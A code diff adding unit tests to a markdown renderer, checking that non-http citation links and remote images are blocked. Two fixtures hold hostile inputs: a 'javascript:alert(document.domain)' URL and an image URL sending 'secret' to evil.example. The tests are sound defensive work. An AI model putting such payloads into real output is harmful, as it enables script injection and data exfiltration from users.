@@ -41,6 +41,17 @@ describe('renderMarkdown', () => {
     expect(html).toContain('&quot;')
   })
 
+  it('never links a citation whose url is not http(s)', () => {
+    const html = renderMarkdown('see ^1^', [{ title: 't', url: 'javascript:alert(document.domain)' }])
+    expect(html).not.toContain('javascript:')
+    expect(html).toContain('^1^')
+  })
+
+  it('does not load remote images (no exfiltration through image URLs)', () => {
+    const html = renderMarkdown('![x](https://evil.example/p.png?d=secret)', [])
+    expect(html).not.toContain('<img')
+  })
+
   it('opens links in a new tab safely', () => {
     const html = renderMarkdown('[docs](https://example.com) and https://bare.example', [])
     expect(html.match(/target="_blank"/g)).toHaveLength(2)
